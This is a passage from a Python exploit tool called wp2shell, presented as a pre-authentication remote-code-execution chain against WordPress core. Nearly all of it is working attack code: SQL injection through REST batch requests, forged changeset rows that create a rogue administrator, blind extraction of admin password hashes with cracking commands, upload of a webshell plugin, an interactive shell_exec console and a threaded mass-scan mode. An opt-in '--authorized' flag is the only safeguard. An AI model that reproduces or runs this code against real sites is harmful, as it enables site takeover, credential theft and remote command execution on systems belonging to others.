    #      calls wp_set_current_user(admin_id), temporarily elevating privileges
    #   5. Two POST /wp/v2/users sub-requests in the same batch create the new
    #      administrator — NO stacked queries, NO FILE privilege required.
    #
    # Key workaround for split-query UNION blockage:
    #   per_page=-1 + orderby=none → WP_Query selects wp_posts.* (23 cols)
    #   so UNION SELECT column count matches.  Credit: sergiointel.
    # ========================================================================

    @staticmethod
    def _sql_hex(value):
        """Encode a string as a MySQL hexadecimal literal."""
        if not value:
            return "''"
        return "0x" + value.encode().hex()

    @staticmethod
    def _post_row(pid, content, title, status, name, parent, post_type):
        """Build one forged wp_posts row (23 columns) for UNION SELECT."""
        ts = WP2Shell._sql_hex("2020-01-01 00:00:00")
        return ",".join([
            str(pid), "1", ts, ts,
            WP2Shell._sql_hex(content), WP2Shell._sql_hex(title), "''",
            WP2Shell._sql_hex(status), WP2Shell._sql_hex("closed"),
            WP2Shell._sql_hex("closed"), "''",
            WP2Shell._sql_hex(name), "''", "''", ts, ts, "''",
            str(parent), "''", "0",
            WP2Shell._sql_hex(post_type), "''", "0",
        ])

    def _public_post_link(self):
        """Return the permalink of the first published post."""
        try:
            url = (f"{self.target}/?rest_route=/wp/v2/posts"
                   f"&per_page=1&_fields=link")
            r = self.s.get(url, timeout=self.timeout)
            items = r.json()
            if isinstance(items, list) and items and items[0].get("link"):
                return items[0]["link"]
            raise ValueError("no link in response")
        except Exception:
            raise RuntimeError(
                "no published post found — complete WordPress "
                "installation first (need ≥1 published post)"
            )

    def _seed_oembed_posts(self, public_post_link):
        """Create 3 real oembed_cache posts via UNION SELECT.

        Injects a forged post containing [embed] shortcodes.  WordPress
        processes the shortcode via oEmbed, creating real cache posts.
        Returns (token, [embed_url_0, embed_url_1, embed_url_2]).
        """
        log("Seeding 3 oEmbed cache posts...")
        token = rand_string(12)
        parsed = urlparse(public_post_link)
        embed_urls = []
        for idx in range(3):
            embed_urls.append(urlunsplit((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.query, f"{token}{idx}",
            )))

        seed_content = "".join(
            f'[embed width="500" height="750"]{u}[/embed]'
            for u in embed_urls
        )
        seed_query = (
            "1) AND 1=0 UNION ALL SELECT "
            + self._post_row(
                0, seed_content, "seed", "publish", "seed", 0, "post")
            + " -- -"
        )
        inner = [
            {"method": "GET", "path": "http://:"},
            {"method": "GET", "path": "/wp/v2/widgets?" + urlencode({
                "author_exclude": seed_query,
                "per_page": -1,
                "orderby": "none",
                "context": "view",
            })},
            {"method": "GET", "path": "/wp/v2/posts"},
        ]
        # Need standard 3-request batch for this (not 4-request)
        outer = [
            self._malformed(),
            {"method": "POST", "path": "/wp/v2/posts",
             "body": {"requests": inner}},
            {"method": "POST", "path": "/batch/v1"},
        ]
        self._batch(outer, extra_timeout=15)
        return token, embed_urls

    def _recover_table_prefix(self):
        """Blind-extract wp_posts table name and existing admin ID."""
        log("Extracting table prefix and admin user ID...")
        posts_table = self._extract_string(
            "SELECT TABLE_NAME FROM information_schema.TABLES "
            "WHERE TABLE_SCHEMA=DATABASE() "
            "AND TABLE_NAME LIKE '%posts' LIMIT 1",
            label="posts_table", max_len=40,
        )
        if not posts_table:
            raise RuntimeError("could not determine posts table name")
        # Update table prefix from posts table name
        self.tp = posts_table[:-5]  # strip 'posts' suffix

        admin_id = self._extract_string(
            f"SELECT u.ID FROM {self.tp}users u "
            f"JOIN {self.tp}usermeta m ON m.user_id=u.ID "
            f"WHERE m.meta_key=0x"
            f"{(self.tp + 'capabilities').encode().hex()} "
            "AND INSTR(m.meta_value,"
            + self._sql_hex('s:13:"administrator";b:1;')
            + ")>0 ORDER BY u.ID LIMIT 1",
            label="admin_id", max_len=8,
        )
        if not admin_id or not admin_id.isdigit():
            raise RuntimeError("could not locate an existing admin user")
        log(f"Posts table: {posts_table}, admin ID: {admin_id}", "+")
        return posts_table, int(admin_id)

    def _recover_cache_post_ids(self, posts_table, embed_urls):
        """Blind-extract the database IDs of the 3 oembed_cache posts."""
        log("Recovering oEmbed cache post IDs...")
        embed_size = ('a:2:{s:5:"width";s:3:"500";'
                      's:6:"height";s:3:"750";}')
        cache_ids = []
        for idx, embed_url in enumerate(embed_urls):
            cache_key = hashlib.md5(
                (embed_url + embed_size).encode()).hexdigest()
            pid = self._extract_string(
                f"SELECT ID FROM {posts_table} "
                "WHERE post_type=0x6f656d6265645f6361636865 "
                f"AND post_name=0x{cache_key.encode().hex()} "
                "ORDER BY ID DESC LIMIT 1",
                label=f"cache_id[{idx}]", max_len=8,
            )
            if not pid or not pid.isdigit() or int(pid) < 1:
                raise RuntimeError(
                    f"could not recover oEmbed cache post {idx}")
            cache_ids.append(int(pid))
        log(f"Cache post IDs: {cache_ids}", "+")
        return cache_ids

    def _create_admin_via_changeset(
        self, admin_id, cache_ids, embed_urls,
        username, password, email,
    ):
        """Publish a forged changeset → create administrator.

        UNION SELECT returns 7 forged wp_posts rows.  The changeset row
        carries nav_menu_item settings with the existing admin's user_id.
        WordPress processes the changeset → wp_set_current_user(admin_id)
        → two POST /wp/v2/users sub-requests bypass auth → admin created.
        """
        log("Publishing forged changeset → creating administrator...")

        outer_loop_id = 1_800_000_000 + random.randint(0, 99_999_999)
        nav_item_id = outer_loop_id + 1
        inner_loop_id = outer_loop_id + 2

        # Build changeset JSON with user_id = existing admin
        changeset_json = json.dumps({
            f"nav_menu_item[{nav_item_id}]": {
                "value": {
                    "object_id": 0, "object": "",
                    "menu_item_parent": 0, "position": 0,
                    "type": "custom", "title": "proof",
                    "url": "https://github.com/vulhub/vulhub",
                    "target": "", "attr_title": "",
                    "description": "proof", "classes": "",
                    "xfn": "", "status": "publish",
                    "nav_menu_term_id": 0, "_invalid": False,
                },
                "type": "nav_menu_item",
                "user_id": admin_id,  # ← triggers wp_set_current_user()
            }
        }, separators=(",", ":"))

        poisoned = [
            # [0] trigger: embed shortcode → triggers oEmbed re-processing
            self._post_row(
                0,
                f'[embed width="500" height="750"]{embed_urls[1]}[/embed]',
                "trigger", "publish", "trigger", 0, "post"),
            # [1] changeset: the forged customize_changeset
            self._post_row(
                cache_ids[0], changeset_json,
                "changeset", "future", str(uuid.uuid4()),
                outer_loop_id, "customize_changeset"),
            # [2] outer: draft post parented to changeset
            self._post_row(
                outer_loop_id, "outer", "outer", "draft",
                "outer", cache_ids[0], "post"),
            # [3] cache[1]: repurposed as publish
            self._post_row(
                cache_ids[1], "", "cache", "publish",
                "cache", cache_ids[0], "post"),
            # [4] nav_menu_item: linked to cache[2]
            self._post_row(
                nav_item_id, "nav", "nav", "publish",
                "nav", cache_ids[2], "nav_menu_item"),
            # [5] request: parented to inner_loop_id
            self._post_row(
                cache_ids[2], "parse", "parse", "parse",
                "parse", inner_loop_id, "request"),
            # [6] inner: draft post parented to cache[2]
            self._post_row(
                inner_loop_id, "inner", "inner", "draft",
                "inner", cache_ids[2], "post"),
        ]

        escalation_query = (
            "1) AND 1=0 UNION ALL SELECT "
            + " UNION ALL SELECT ".join(poisoned)
            + " -- -"
        )

        new_admin = {
            "username": username, "email": email,
            "password": password, "roles": ["administrator"],
        }

        # Batch: [malformed, inject, posts, user, user]
        # Desync: inject→posts(SQLi+changeset), posts→user1(bypass auth),
        #         user1→user2(backup creation)
        inner = [
            {"method": "GET", "path": "http://:"},
            {"method": "GET", "path": "/wp/v2/widgets?" + urlencode({
                "author_exclude": escalation_query,
                "per_page": -1, "orderby": "none", "context": "view",
            })},
            {"method": "GET", "path": "/wp/v2/posts"},
            {"method": "POST", "path": "/wp/v2/users",
             "body": new_admin},
            {"method": "POST", "path": "/wp/v2/users",
             "body": new_admin},
        ]
        # Standard 3-request outer batch
        outer = [
            self._malformed(),
            {"method": "POST", "path": "/wp/v2/posts",
             "body": {"requests": inner}},
            {"method": "POST", "path": "/batch/v1"},
        ]
        try:
            self._batch(outer, extra_timeout=20)
        except Exception:
            pass

    def _verify_admin_exists(self, username):
        """Blind-verify the new user exists with administrator role."""
        log(f"Verifying '{username}' exists with administrator role...")
        cond = (
            f"EXISTS(SELECT 1 FROM {self.tp}users u "
            f"JOIN {self.tp}usermeta m ON m.user_id=u.ID "
            f"WHERE u.user_login=" + self._sql_hex(username)
            + f" AND m.meta_key="
            + self._sql_hex(self.tp + "capabilities")
            + " AND INSTR(m.meta_value,"
            + self._sql_hex('s:13:"administrator";b:1;')
            + ")>0)"
        )
        return self._sqli_bool(cond) is True

    def _changeset_create_admin(self, username, password, email=None):
        """Full changeset-forging admin creation chain.

        Creates a new administrator account without stacked queries or
        FILE privilege.  Requires ≥1 published post on the target.
        Returns True if the admin was created and verified.
        """
        if email is None:
            email = f"{username}@{rand_string(6)}.com"

        try:
            # Step 1: Seed oEmbed cache posts
            public_post = self._public_post_link()
            token, embed_urls = self._seed_oembed_posts(public_post)

            # Step 2: Blind-extract table info
            posts_table, admin_id = self._recover_table_prefix()

            # Step 3: Recover cache post IDs
            cache_ids = self._recover_cache_post_ids(
                posts_table, embed_urls)

            # Step 4: Forge changeset → create admin
            self._create_admin_via_changeset(
                admin_id, cache_ids, embed_urls,
                username, password, email,
            )

            # Step 5: Verify
            if self._verify_admin_exists(username):
                log(f"Administrator '{username}' created and verified!",
                    "+")
                return True
            log("Admin creation may have succeeded but verification "
                "failed — attempting login...", "!")
            if self._wp_login(username, password):
                log(f"Administrator '{username}' confirmed via login",
                    "+")
                return True
            log("Admin creation could not be verified", "-")
            return False
        except RuntimeError as e:
            log(f"Changeset admin creation failed: {e}", "-")
            return False

    # -- Legacy: stacked INSERT (kept for rare configurations) ---------

    def _sqli_create_admin(self, username, password, email=None):
        """Legacy stacked INSERT admin creation (needs multi_query).

        Superseded by _changeset_create_admin which works on all configs.
        Kept as fallback for rare MySQL configs with multi_query enabled.
        """
        log(f"Creating administrator '{username}' via stacked SQLi...")
        if email is None:
            email = f"{username}@{rand_string(6)}.com"

        md5_hash = hashlib.md5(password.encode()).hexdigest()
        caps = ("a:1:{s:13:\\\"administrator\\\";b:1;}")

        sqli_value = (
            f"SELECT 1;"
            f"INSERT INTO {self.tp}users "
            f"(user_login,user_pass,user_nicename,user_email,"
            f"user_registered,user_status,display_name) VALUES "
            f"('{username}','{md5_hash}','{username}','{email}',"
            f"NOW(),0,'{username}');"
            f"INSERT INTO {self.tp}usermeta "
            f"(user_id,meta_key,meta_value) VALUES "
            f"((SELECT ID FROM {self.tp}users "
            f"WHERE user_login='{username}'),"
            f"'{self.tp}capabilities','{caps}'),"
            f"((SELECT ID FROM {self.tp}users "
            f"WHERE user_login='{username}'),"
            f"'{self.tp}user_level','10')"
        )

        inner_requests = [
            {"method": "GET", "path": "http://:"},
            {"method": "GET", "path": "/wp/v2/categories?" + urlencode(
                {"author_exclude": sqli_value})},
            {"method": "GET", "path": "/wp/v2/posts"},
        ]
        outer_batch = [
            self._malformed(),
            {"method": "POST", "path": "/wp/v2/posts",
             "body": {"requests": inner_requests}},
            {"method": "POST", "path": "/batch/v1"},
        ]
        try:
            self._batch(outer_batch, extra_timeout=10)
        except Exception:
            pass

        log(f"Attempting login as '{username}'...")
        if self._wp_login(username, password):
            log(f"Administrator '{username}' created and authenticated",
                "+")
            return True
        log("Stacked INSERT failed (mysqli may not support multi_query)",
            "!")
        return False

    # ========================================================================
    # Orchestration
    # ========================================================================

    def exploit(self, webroot="/var/www/html", shell_key=None,
                admin_user=None, admin_pass=None, skip_outfile=False,
                skip_create_admin=False, skip_union_outfile=False):
        """Full pre-auth RCE chain.

        Tries the fastest RCE path first, falling back through
        progressively slower methods:

          3a  UNION SELECT INTO OUTFILE → direct webshell write
              (fastest; needs MySQL FILE priv + writable webroot)
          3b  Stacked INSERT → create admin → login → plugin upload
              (needs multi_query support, rare)
          3c  Subquery INTO OUTFILE → direct webshell write
              (legacy; needs FILE priv + permissive secure_file_priv)
          3d  Blind extraction of existing admin + hash crack
              (slow but works on any vulnerable instance)
        """
        if shell_key is None:
            shell_key = rand_string(24)
        if admin_user is None:
            admin_user = "wp_support_" + rand_string(6)
        if admin_pass is None:
            admin_pass = "wp2shell_" + rand_string(12)

        print(BANNER)
        log(f"Target:        {self.target}")
        log(f"Batch URL:     {self.batch_url}")
        log(f"Shell key:     {shell_key}")
        log(f"Admin user:    {admin_user}")
        log(f"Admin pass:    {admin_pass}")
        print()

        # -- Phase 1: Desync detection --
        vuln = self.check()
        if vuln is None:
            log("Could not confirm vulnerability, proceeding...", "!")
        elif not vuln:
            log("Target appears patched. Aborting.", "-")
            return False
        print()

        # -- Phase 2: SQLi confirmation --
        if not self._sqli_confirm():
            log("SQL injection could not be confirmed", "-")
            log("The target may have additional hardening", "!")
            return False
        print()

        # -- Phase 3a: UNION SELECT INTO OUTFILE (fastest, need FILE priv) --
        if not skip_union_outfile:
            log("Phase 3a: UNION SELECT INTO OUTFILE")
            if self._try_union_outfile(webroot, shell_key):
                print()
                self._interactive_shell()
                return True
            print()

        # -- Phase 3b: Changeset-forging admin creation (no multi_query needed) --
        if not skip_create_admin:
            log("Phase 3b: Changeset-forging admin creation")
            if self._changeset_create_admin(admin_user, admin_pass):
                print()
                self._upload_shell_plugin(shell_key)
                if self.shell_url:
                    self._interactive_shell()
                    return True
                return False
            log("Falling back to stacked INSERT...", "!")
            if self._sqli_create_admin(admin_user, admin_pass):
                print()
                self._upload_shell_plugin(shell_key)
                if self.shell_url:
                    self._interactive_shell()
                    return True
                return False
            print()

        # -- Phase 3c: Legacy subquery OUTFILE (FILE priv + writable dir) --
        if not skip_outfile:
            log("Phase 3c: Direct webshell via SELECT INTO OUTFILE (legacy)")
            if self._try_outfile(webroot, shell_key):
                print()
                self._interactive_shell()
                return True
            print()

        # -- Phase 3d: Extract admin creds via blind SQLi --
        log("Phase 3d: Extracting admin credentials via blind SQLi...")
        log("(This will take several minutes)")
        print()
        ext_user, ext_hash = self._extract_admin_creds()
        if not ext_user:
            log("Failed to extract admin credentials", "-")
            return False

        print()
        log(f"Existing admin user:  {ext_user}", "+")
        log(f"Existing admin hash:  {ext_hash}", "+")
        print()

        # -- Phase 3e: Try stacked UPDATE on existing admin --
        log(f"Phase 3e: Updating existing admin password to: {admin_pass}")
        if self._sqli_update_password(ext_user, admin_pass):
            log("Password updated!", "+")
            self._upload_shell_plugin(shell_key)
            if self.shell_url:
                self._interactive_shell()
            return True

        # -- Phase 3f: Offline crack instructions --
        print()
        log("Phase 3f: Direct password update failed. "
            "Crack the hash offline:", "!")
        print()
        log(f"  echo '{ext_hash}' > hash.txt", ">")
        log(f"  hashcat -m 400 hash.txt rockyou.txt", ">")
        log(f"  john --format=phpass hash.txt", ">")
        print()
        log("Then re-run:", "!")
        log(f"  python wp2shell.py {self.target} --shell "
            f"--admin-user {ext_user} --admin-pass <cracked>", ">")
        log("Or re-run with the created admin credentials:", "!")
        log(f"  python wp2shell.py {self.target} --shell "
            f"--admin-user {admin_user} --admin-pass {admin_pass}", ">")
        return False

    def exploit_with_creds(self, username, password, shell_key=None):
        """RCE given known admin credentials (post-crack path)."""
        if shell_key is None:
            shell_key = rand_string(24)

        print(BANNER)
        log(f"Target: {self.target}")
        log(f"Logging in as: {username}")
        print()

        if not self._wp_login(username, password):
            return False

        self._upload_shell_plugin(shell_key)
        if self.shell_url:
            self._interactive_shell()
            return True
        return False

    def extract_data(self, query):
        """One-shot SQL query extraction via blind SQLi.

        Calibrates the oracle, then extracts the full result string.
        """
        print(BANNER)
        log(f"Target:    {self.target}")
        log(f"Batch URL: {self.batch_url}")
        log(f"Query:     {query}")
        print()

        vuln = self.check()
        if vuln is None:
            log("Could not confirm vulnerability, proceeding...", "!")
        elif not vuln:
            log("Target appears patched. Aborting.", "-")
            return None
        print()

        if not self._sqli_calibrate():
            log("SQL injection did not fire", "-")
            return None

        t1 = self._sqli_bool("1=1")
        t2 = self._sqli_bool("1=0")
        if not (t1 and not t2):
            log("Oracle verification failed", "-")
            return None
        log("Oracle verified", "+")
        print()

        result = self._extract_string(query, label="result", max_len=256)
        return result

    # -- Interactive shell ---------------------------------------------------

    def _interactive_shell(self):
        print()
        log(f"Shell URL: {self.shell_url}", "+")
        log(f"Shell key: {self.shell_key}", "+")
        print()
        log("Interactive shell (type 'exit' to quit)", ">")
        print()

        while True:
            try:
                cmd = input("\033[91mwp2shell\033[0m> ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break
            if not cmd or cmd.lower() in ('exit', 'quit'):
                break

            b64cmd = base64.b64encode(
                f"echo shell_exec('{cmd}');".encode()
            ).decode()
            try:
                r = self.s.get(
                    self.shell_url,
                    params={"k": self.shell_key, "c": b64cmd},
                    timeout=self.timeout)
                output = r.text.strip()
                if output:
                    print(output)
                else:
                    print("(no output)")
            except Exception as e:
                print(f"  Request failed: {e}")

    # -- Cleanup -------------------------------------------------------------

    def cleanup(self, username=None, password=None, shell_key=None):
        print(BANNER)
        log("Cleaning up...")

        if username and password:
            if not self._wp_login(username, password):
                log("Login failed, cannot clean up", "-")
                return False

        plugins_url = self.target + "/wp-admin/plugins.php"
        r = self.s.get(plugins_url, timeout=self.timeout)

        deact = re.search(
            rf'action=deactivate&amp;plugin='
            rf'({re.escape(self.SHELL_PLUGIN)}[^"&]+)'
            rf'&amp;_wpnonce=([a-f0-9]+)', r.text)
        if deact:
            plugin_file = deact.group(1)
            nonce = deact.group(2)
            self.s.get(
                f"{self.target}/wp-admin/plugins.php?"
                f"action=deactivate&plugin={plugin_file}"
                f"&_wpnonce={nonce}",
                timeout=self.timeout)
            log("Plugin deactivated", "+")

        if shell_key:
            shell_url = (f"{self.target}/wp-content/plugins/"
                         f"{self.SHELL_PLUGIN}/{self.SHELL_PLUGIN}.php")
            rm_payload = base64.b64encode(
                b"unlink(__FILE__); rmdir(dirname(__FILE__));").decode()
            try:
                self.s.get(shell_url,
                           params={"k": shell_key, "c": rm_payload},
                           timeout=10)
                log("Shell files removed", "+")
            except Exception:
                pass

        log("Cleanup complete", "+")
        return True


# ---- CLI -------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="wp2shell - Pre-Auth RCE in WordPress Core "
                    "(CVE-2026-63030)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=BANNER)

    parser.add_argument("target", nargs="?",
                        help="WordPress URL (http:// or https://)")

    mode = parser.add_mutually_exclusive_group()
    mode.add_argument("--check", action="store_true",
                      help="Non-destructive vulnerability probe only")
    mode.add_argument("--exploit", action="store_true",
                      help="Full pre-auth RCE chain")
    mode.add_argument("--shell", action="store_true",
                      help="Deploy shell with known admin creds")
    mode.add_argument("--cleanup", action="store_true",
                      help="Remove deployed webshell")
    mode.add_argument("--extract", metavar="SQL",
                      help="Extract data via blind SQLi "
                           "(e.g. \"SELECT user_login FROM wp_users LIMIT 1\")")
    mode.add_argument("--create-admin-only", action="store_true",
                      help="Create an admin account via changeset "
                           "forgery and verify, then exit (no RCE)")

    parser.add_argument("--proxy",
                        help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--timeout", type=int, default=30,
                        help="HTTP timeout seconds (default: 30)")
    parser.add_argument("--table-prefix", default="wp_",
                        help="WP table prefix (default: wp_)")
    parser.add_argument("--webroot", default="/var/www/html",
                        help="Server webroot for OUTFILE "
                             "(default: /var/www/html)")
    parser.add_argument("--shell-key",
                        help="Webshell auth key (random if omitted)")
    parser.add_argument("--admin-user",
                        help="Admin username (for --exploit --shell "
                             "--cleanup; random if omitted)")
    parser.add_argument("--admin-pass",
                        help="Admin password (for --exploit --shell "
                             "--cleanup; random if omitted)")
    parser.add_argument("--skip-outfile", action="store_true",
                        help="Skip SELECT INTO OUTFILE attempt")
    parser.add_argument("--no-union-outfile", action="store_true",
                        help="Skip UNION SELECT INTO OUTFILE attempt")
    parser.add_argument("--no-create-admin", action="store_true",
                        help="Skip stacked INSERT admin creation "
                             "(fall through to OUTFILE / blind extraction)")
    parser.add_argument("--sleep", type=float, default=0.15,
                        help="SLEEP duration for blind SQLi (default: 0.15)")
    parser.add_argument("--time-based", action="store_true",
                        help="Use SLEEP-based timing oracle instead of "
                             "content-based (slower but works without "
                             "published posts)")
    parser.add_argument("--skip-version-check", action="store_true",
                        help="Skip WordPress version detection "
                             "(use when version can't be fingerprinted)")
    parser.add_argument("-f", "--file",
                        help="File with one target URL per line (batch scan)")
    parser.add_argument("-t", "--threads", type=int, default=10,
                        help="Concurrent workers for batch scan (default: 10)")
    parser.add_argument("--authorized", action="store_true",
                        help="Assert authorization for remote targets")
    parser.add_argument("--json", action="store_true",
                        help="Emit JSON output (for batch scan)")
    parser.add_argument("--proof", action="store_true",
                        help="Read @@version + current_user() as evidence "
                             "(read-only, requires confirmed SQLi)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose output")

    args = parser.parse_args()

    # -- Batch scan mode (-f/--file) --
    if args.file:
        targets = []
        with open(args.file) as fh:
            for ln in fh:
                ln = ln.strip()
                if ln and not ln.startswith("#"):
                    targets.append(ln if "://" in ln else "http://" + ln)
        if args.target:
            targets.insert(0, args.target)

        remote = [u for u in targets if not _is_local(u)]
        if remote and not args.authorized:
            log("Refusing remote targets without --authorized.", "-")
            log(f"Affected: {', '.join(remote[:5])}"
                f"{'...' if len(remote) > 5 else ''}", "!")
            log("Only test assets you own or are explicitly authorized.", "!")
            sys.exit(2)

        total = len(targets)
        workers = max(1, min(args.threads, total))
        results = [None] * total
        done = [0]
        lock = threading.Lock()

        def _work(idx, u):
            try:
                rec, _ = _scan_one(u, args)
            except Exception as e:
                rec = {"target": u, "status": "error", "error": str(e)}
            with lock:
                done[0] += 1
                results[idx] = rec
                if not args.json:
                    _print_scan_result(rec, done[0], total)
                else:
                    sys.stderr.write(f"\r  scanned {done[0]}/{total}")
                    sys.stderr.flush()
            return rec

        if workers == 1:
            for i, u in enumerate(targets):
                _work(i, u)
        else:
            with ThreadPoolExecutor(max_workers=workers) as ex:
                futs = [ex.submit(_work, i, u) for i, u in enumerate(targets)]
                try:
                    for _ in as_completed(futs):
                        pass
                except KeyboardInterrupt:
                    sys.stderr.write("\ninterrupted\n")
                    ex.shutdown(wait=False, cancel_futures=True)

        results = [r for r in results if r is not None]
        if args.json:
            sys.stderr.write("\n")
            print(json.dumps(results, indent=2))

        c = Counter(r["status"] for r in results)
        print(f"\nsummary: {len(results)} scanned | "
              f"vulnerable={c.get('vulnerable',0)}  "
              f"affected={c.get('affected_version',0)}  "
              f"not_vuln={c.get('not_vulnerable',0)}  "
              f"error={c.get('error',0)}")
        sys.exit(0 if any(
            r["status"] in ("vulnerable", "affected_version")
            for r in results) else 1)

    # -- Single-target mode --
    _has_mode = any([args.check, args.exploit, args.shell,
                     args.cleanup, bool(args.extract),
                     args.create_admin_only])
    if not args.target or not _has_mode:
        parser.error("specify target+mode (--check/--exploit/...) "
                     "or use -f for batch scan")

    # Authorisation guard for remote single targets
    if not _is_local(args.target) and not args.authorized:
        log("Remote target requires --authorized.", "-")
        log("Only test assets you own or are explicitly authorized.", "!")
        sys.exit(2)

    wp = WP2Shell(
        target=args.target,
        proxy=args.proxy,
        timeout=args.timeout,
        table_prefix=args.table_prefix,
        verbose=args.verbose,
        sleep_duration=args.sleep,
        time_based=args.time_based,
    )

    # -- Version check (skip for --shell / --cleanup which use known creds) --
    _needs_version_check = (
        not args.skip_version_check
        and (args.exploit or args.check or bool(args.extract))
    )
    if _needs_version_check:
        ver, classification = wp.check_version()
        ver_str = f"{ver[0]}.{ver[1]}.{ver[2]}" if ver else "unknown"
        if ver is None:
            log(f"WordPress version: {ver_str} (could not detect)", "!")
            log("Use --skip-version-check to bypass version detection "
                "and proceed with exploit attempt.", "!")
            sys.exit(2)
        if classification == 'full_chain':
            log(f"WordPress version: {ver_str} — VULNERABLE (full RCE chain)", "+")
        elif classification == 'sqli_only':
            log(f"WordPress version: {ver_str} — SQLi present but batch "
                f"confusion NOT reachable", "!")
            log("CVE-2026-60137 (author__not_in SQLi) requires a facilitating "
                "plugin/theme to pass a raw string to WP_Query.", "!")
            log("Full pre-auth RCE chain (CVE-2026-63030) only affects "
                "6.9.0–6.9.4 and 7.0.0–7.0.1.", "!")
            if not args.skip_version_check:
                log("Use --skip-version-check to attempt exploitation anyway.", "!")
                sys.exit(2)
        else:
            log(f"WordPress version: {ver_str} — patched or out of range", "-")
            log("Vulnerable ranges:", "!")
            log("  Full RCE: 6.9.0–6.9.4, 7.0.0–7.0.1", "!")
            log("  SQLi only: 6.8.0–6.8.5 (needs facilitating plugin)", "!")
            log("Use --skip-version-check to force exploitation attempt.", "!")
            sys.exit(2)

    if args.create_admin_only:
        print(BANNER)
        log(f"Target:     {wp.target}")
        log(f"Batch URL:  {wp.batch_url}")
        admin_user = args.admin_user or "w2s_" + rand_string(6)
        admin_pass = args.admin_pass or rand_string(24)
        admin_email = (f"{admin_user}@wp2shell.local"
                       if not args.admin_user else
                       f"{admin_user}@{rand_string(6)}.com")
        log(f"Admin user: {admin_user}")
        log(f"Admin pass: {admin_pass}")
        print()

        vuln = wp.check()
        if not vuln:
            log("Target not vulnerable, aborting.", "-")
            sys.exit(1)
        print()

        if not wp._sqli_confirm():
            log("SQLi not confirmed, aborting.", "-")
            sys.exit(1)
        print()

        if wp._changeset_create_admin(admin_user, admin_pass, admin_email):
            print()
            log("=== ADMIN CREATED ===", "+")
            log(f"Username: {admin_user}", "+")
            log(f"Password: {admin_pass}", "+")
            log(f"Email:    {admin_email}", "+")
            log("Use --shell with these credentials for full RCE.", ">")
            sys.exit(0)
        sys.exit(1)

    if args.check:
        print(BANNER)
        result = wp.check()
        sys.exit(0 if result else 1)

    elif args.exploit:
        ok = wp.exploit(
            webroot=args.webroot,
            shell_key=args.shell_key,
            admin_user=args.admin_user,
            admin_pass=args.admin_pass,
            skip_outfile=args.skip_outfile,
            skip_create_admin=args.no_create_admin,
            skip_union_outfile=args.no_union_outfile,
        )
        sys.exit(0 if ok else 1)

    elif args.shell:
        if not args.admin_user or not args.admin_pass:
            parser.error("--shell requires --admin-user and --admin-pass")
        ok = wp.exploit_with_creds(
            args.admin_user, args.admin_pass, args.shell_key)
        sys.exit(0 if ok else 1)

    elif args.cleanup:
        ok = wp.cleanup(
            args.admin_user, args.admin_pass, args.shell_key)
        sys.exit(0 if ok else 1)

    elif args.extract:
        if args.proof:
            # Read-only evidence: @@version + current_user()
            for label, query in [
                ("@@version", "SELECT @@version"),
                ("current_user()", "SELECT CURRENT_USER()"),
            ]:
                log(f"Reading {label}...")
                result = wp.extract_data(query)
                if result:
                    log(f"{label}: {result}", "+")
                else:
                    log(f"{label}: FAILED", "-")
            sys.exit(0)
        result = wp.extract_data(args.extract)
        if result:
            print()
            log(f"Result: {result}", "+")
            sys.exit(0)
        sys.exit(1)


# -- batch-scan helpers (module-level) ------------------------------------

def _is_local(url):
    host = urlparse(url).hostname or ""
    return host in ("localhost", "127.0.0.1", "::1", "[::1]")


def _scan_one(target_url, args):
    """Scan a single target; returns (record, exit_code)."""
    rec = {"target": target_url}
    try:
        wp = WP2Shell(
            target=target_url, proxy=args.proxy,
            timeout=args.timeout, table_prefix=args.table_prefix,
            verbose=False, sleep_duration=args.sleep,
            time_based=args.time_based,
        )
        ver, classification = wp.check_version()
        rec["wp_version"] = f"{ver[0]}.{ver[1]}.{ver[2]}" if ver else None
        rec["version_verdict"] = classification or "unknown"

        vuln = wp.check()
        if vuln is True:
            rec["status"] = "vulnerable"
            rec["active_check"] = "confirmed"
        elif vuln is None and classification == "full_chain":
            rec["status"] = "affected_version"
            rec["active_check"] = "inconclusive"
            rec["note"] = "version in full-chain range but probe inconclusive"
        elif classification == "sqli_only":
            rec["status"] = "affected_version"
            rec["active_check"] = "negative"
            rec["note"] = ("SQLi sink present (CVE-2026-60137) but batch "
                           "confusion not reachable on 6.8.x — needs "
                           "facilitating plugin/theme")
        elif classification == "patched":
            rec["status"] = "not_vulnerable"
            rec["active_check"] = "negative"
        else:
            rec["status"] = "unknown"
            rec["active_check"] = rec.get("active_check", "error")

        if getattr(args, "proof", False) and vuln is True:
            try:
                rec["proof"] = {
                    "@@version": wp.extract_data(
                        "SELECT @@version",),
                    "current_user()": wp.extract_data(
                        "SELECT CURRENT_USER()",),
                }
            except Exception as e:
                rec["proof_error"] = str(e)
    except Exception as e:
        rec["status"] = "error"
        rec["error"] = str(e)
    code = 0 if rec["status"] in ("vulnerable", "affected_version") else 1
    return rec, code


def _print_scan_result(rec, index=0, total=1):
    """Human-readable scan result line."""
    tag_colors = {
        "vulnerable": "\033[91m", "affected_version": "\033[93m",
        "not_vulnerable": "\033[92m", "unknown": "\033[96m",
        "error": "\033[90m",
    }
    tag = {
        "vulnerable": "VULNERABLE",
        "affected_version": "AFFECTED",
        "not_vulnerable": "not vulnerable",
        "unknown": "unknown",
        "error": "ERROR",
    }[rec["status"]]
    c = tag_colors.get(rec["status"], "")
    pfx = f"[{index}/{total}] " if total > 1 else ""
    line = f"  {c}[{tag}]\033[0m {pfx}{rec['target']}"
    if rec.get("wp_version"):
        line += f"  (WP {rec['wp_version']}, {rec['version_verdict']})"
    if rec.get("note"):
        line += f"\n        note: {rec['note']}"
    if rec.get("proof"):
        for k, v in rec["proof"].items():
            line += f"\n        proof  {k:16s} = {v}"
    if rec.get("error"):
        line += f"  -- {rec['error']}"
    print(line)


if __name__ == "__main__":
    main()
